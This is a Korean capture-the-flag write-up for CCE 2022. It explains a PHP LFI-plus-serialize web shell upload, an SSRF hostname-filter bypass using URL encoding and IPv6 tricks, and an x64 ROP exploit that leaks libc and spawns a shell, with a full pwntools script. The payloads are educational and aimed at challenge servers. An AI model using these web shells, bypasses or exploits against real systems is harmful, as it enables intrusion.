# CCE 2022

# WEB

## reborn of php

---

`/flag`를 읽는 것이 목표다.

```python
<?php
    define('__MAIN__', true);
    include('lib/controller.lib.php');
    include('lib/util.lib.php');
        
    $board = $_GET['b'] ? $_GET['b'] : 'main' ;
    $action = $_GET['a'] ? $_GET['a'] : 'index';
   
    $controller = new Controller($board, $action);
    $controller->process();
    
?>
```

index.php를 보면 b, a 파라미터를 이용해서 페이지 전환한다.

![Untitled](CCE%202022%20(1)%20c8e6a917993846b4b34a73854c2ac5c2/Untitled.png)

간단하게 설명하면 b는 디렉토리, a는 php파일이다.

```python
<?php if(!defined('__MAIN__')) exit; ?>
<?php
    class Controller {
        private $board = '';
        private $action = '';

        function __construct($board, $action) {
            $this->board = $board;
            $this->action = $action;

            if(!preg_match('/^[a-z0-9:.]+$/i', $this->board)){
                $this->board = 'main';
                $this->action = 'index';
           }
        }
       
        function process() {
            $path = "{$this->board}/{$this->action}";
            
            if(preg_match('/php|html/i',  $path)){
                alert('not invalid', 'back');
            }           

            chdir('pages/');
            if(!file_exists("{$path}.php")) $path = 'main/index';
            include("{$path}.php");
       }     
    }
?>
```

controller.lib.php 코드다.

process()에서 b, a 파라미터를 이용하여 페이지 전환을 하고 있다.

process()는 

```python
$path = b/a 
```

와 같은 형식으로 path를 생성하고 `b/a.php` 파일을 include한다.

```python
function __construct($board, $action) {
    $this->board = $board;
    $this->action = $action;

    if(!preg_match('/^[a-z0-9:.]+$/i', $this->board)){
        $this->board = 'main';
        $this->action = 'index';
   }
}
```

생성자 부분을 보면 board (b 파라미터)를 정규식으로 검증하고 있다.

하지만 action(a 파라미터)에 대한 검증은 없다. 따라서 a 파라미터를 이용해서 LFI를 수행할 수 있다.

```python
<?php if(!defined('__MAIN__')) die('Access denied'); ?>

<?php
    $id = $_POST['id'];
    $pw = $_POST['pw'];

    if(!$id || !$pw) alert('invalid input', 'back');

    if(!is_valid_id($id)) alert('invalid id', 'back');

    if(is_exists_user($id)){
        alert('already joined', 'back');
    }

    save_user_id($id, $pw);

    alert('welcome', '/');
?>
```

register.php 코드다.

사용자 계정을 생성하는 역할이다.

코드를 보면, `save_user_id()`를 실행한다.

```python
function save_user_id($id, $pw){
    chdir('../');
    file_put_contents("dbs/{$id}", serialize($pw));
}
```

`save_user_id()`는 util.lib.php에서 찾을 수 있었다. 

$pw를 `serialize($pw)`로 serialize를 수행하고 서버의 dbs/$id 경로에 파일로 저장한다.

이때, $pw에 대한 검증이 없다. 따라서 serialize 취약점을 이용한 RCE가 가능하다.

필자는 $pw로 웹쉘 코드를 업로드했다.

공격 시나리오를 정리하면 다음과 같다.

1. `save_user_id()`를 이용해서 “/dbs/$id” 에 웹쉘을 업로드한다.
    1. ex) $id: `keyme.php` , $pw: `<?php system($_GET['cmd']); ?>`
2. `process()`의 $action을 이용해서 LFI로 웹쉘에 접근한다.
    1. ex) ?b=dbs&a=keyme
3. 웹쉘을 이용해서 flag를 획득한다.
    1. ex) ?b=dbs&a=keyme&cmd=../../../flag
    2. 웹쉘에 접근할 때, cmd 파라미터를 같이 전송하면 웹쉘을 사용할 수 있다.

지금까지 작성한 내용 중에 다음과 같은 의문들이 발생할 수 있다.

`serialize()`로 웹쉘을 업로드한다면, “/dbs/$id” 파일에 

```python
s:[문자열 길이]:[php 웹쉘 코드]
```

로 저장될텐데, process()를 통해서 접근했을 때, 왜 PHP 코드가 실행될까?

이유는 serialize된 데이터를 include하는 것이므로 [php 웹쉘 코드]가 php 코드로 동작하면서 실행된다.

![Untitled](CCE%202022%20(1)%20c8e6a917993846b4b34a73854c2ac5c2/Untitled%201.png)

해당 문제는 언인텐 풀이가 존재했다. 특이한 방법이라 추가로 작성했다.

tar 파일을 생성하고 phar:// wrapper를 이용해서 접근해서 RCE 하는 방식이다.

## babyweb

---

```python
from flask import Flask
from flask import request
from secret import FLAG

app = Flask(__name__)

@app.route('/flag', methods=['GET'])
def index():
    if request.host == "flag.service":
        return FLAG
    else:
        return "Nice try :)"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

SSRF로 internal 서버의 `http://flag.service/flag` 에 접근하면 flag를 획득할 수 있다.

public 서버의 코드를 분석해보자.

```python
import urllib
import urllib.parse
import requests
import ipaddress
from flask import Flask
from flask import request
import socket

app = Flask(__name__)

data = """
<html>
<head>
<title>BabyWeb</title>
</head>
<body>
<form action="/" method="POST">
<input type="text" name="url">
<input type="submit">
</form>
</body>
</html>
"""

def valid_ip(ip):
    try:
        ip = socket.gethostbyname(ip)
        is_internal = ipaddress.ip_address(ip).is_global
        if(is_internal):
            return False
        else:
            return True
    except:
        pass

@app.route('/', methods=['GET','POST'])
def index():
    if request.method == "POST":
        try:
            url = request.form['url']
            result = urllib.parse.urlparse(url)
            if result.hostname == 'flag.service':
                return "Not allow"
            else:
                if(valid_ip(result.hostname)):
                    return "huh??"
                else:
                    return requests.get("http://"+result.hostname+result.path, allow_redirects=False).text
        except:
            return "Something wrong..."
    elif request.method == "GET":
        return data

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

url을 입력해서 요청하는 서비스를 제공한다. url 파라미터로 전달한 hostname과 path를 이용하여 `requests.get()`로 요청하는 코드다.

목표는 flag.service/flag에 접근하는 것이다. 하지만 flag.service를 hostname으로 작성하면 if문에 검증로직에 걸린다.

```python
if result.hostname == 'flag.service':
```

if문 검증로직을 보자.

==를 이용해서 문자열 비교하고 있다. 그렇다면, `flag%2eservice`와 같은 형태로 hostname 일부를 url 인코딩하면 if문 검증로직을 우회할 수 있다.

```python
def valid_ip(ip):
    try:
        ip = socket.gethostbyname(ip)
        is_internal = ipaddress.ip_address(ip).is_global
        if(is_internal):
            return False
        else:
            return True
    except:
        pass
```

`valid_ip()`도 try except 문에서 에러가 발생해서 pass된다.

모든 검증 로직을 우회하면 다음과 같이 internal 서버에 요청을 보낼 수 있다.

```python
return requests.get("http://"+result.hostname+result.path, allow_redirects=False).text
```

`request.get()`를 통해 internal 서버의 `http://flag.service/flag`[로](http://flag.service/flag로) 요청하고 응답을 받는다.

여기서 의문이 생길 수 있는 부분이 있다. hostname으로 `flag%2eservice` 를 입력했는데, 어떻게 요청은 `http://flag.service/flag` 가 될까?

그 이유는 `request.get()` 함수는 내부적으로 url 인코딩된 인자를 url 디코딩하도록 동작하기 때문이다.

이런 이유로 `flag%2eservice`와 같이 hostname을 전송하더라도 `http://flag.service/flag`로 요청된다.

참고로 

```python
http://flag.service\/../flag

http://[flag.service:80]/flag
```

위와 같은 payload로 우회할 수도 있다.

개인적으로 IPV6를 이용해서 우회하는 것은 신박했다. IPV6로 우회가능한 이유는 urllib.parse.urlparse 코드를 보면 알 수 있는데, IPV6와 관련된 작업을 대충처리해서 쉽게 우회되는 방식이었다.

# PWN

## x64_rop

---

```c
ssize_t rop()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  return read(0, buf, 0x200uLL);
}
```

rop 함수에서 BOF가 발생한다.

rop chain을 구성해서 exploit을 수행하면 된다.

```python
from pwn import *
import warnings

warnings.filterwarnings("ignore")

p = process('./x64_rop', env={'LD_PRELOAD':'./libc.so.6'})
e = ELF("./x64_rop")
libc = ELF("./libc.so.6")

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.sym['main']
pop_rdi = 0x401203
ret = 0x40101a

# puts(puts_got) ; call main
payload = b"\x90"*0x18
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendlineafter(": ", "1")
p.sendline(payload)

# Leak libc base
puts = u64(p.recv(6)+b"\x00"*2)
lb = puts - libc.sym["puts"]
system = lb + libc.sym["system"]
binsh = lb + list(libc.search(b"/bin/sh"))[0]
exit_func = lb + libc.sym["exit"]

log.info(hex(lb))

# system("/bin/sh")
payload = b"\x90"*0x18
'''
p64(ret)이 반드시 들어가야되는 이유
: MOVAPS 이슈 때문이다. -> RSP가 16배수로 유지되야하는데, 그게 아니라서 에러가 발생하는 거임
64bit 에서는 간단하게 ROP chain 전에 RET 가젯을 써서 이슈를 해결할 수 있음
'''
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.sendlineafter(": ", "1")
p.sendline(payload)

p.interactive()
```